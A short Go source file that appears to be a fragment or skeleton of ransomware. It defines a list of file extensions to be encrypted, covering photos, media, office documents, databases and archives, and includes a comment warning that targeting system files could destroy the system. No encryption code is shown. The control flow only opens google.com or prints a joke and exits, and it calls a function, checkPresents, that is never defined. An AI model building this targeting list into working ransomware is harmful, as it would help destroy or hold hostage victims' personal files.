package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

var (
	// List of extensions which will be encrypted
	extensions = []string{
		// 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  // SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
		"JPEG", "jpg", "bmp", "gif", "png", "svg", "psd", "raw", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", // Microsoft office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web technologies

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // compressed formats
	}

	// Get the OS
	runtimeOS = runtime.GOOS
)

func letItBurn(presents bool) {
	if presents {
		retreat()
	} else {
		fmt.Println("Oh, nooo!Work again?! \nDobby will never be free...")
	}
	os.Exit(0)
}

func retreat() {
	url := "https://google.com"
	if runtimeOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	} else if runtimeOS == "linux" {
		_ = exec.Command("xdg-open", url).Start()
	}
}

func main() {
	if checkPresents() {
		letItBurn(true)
	}
	letItBurn(false)
}
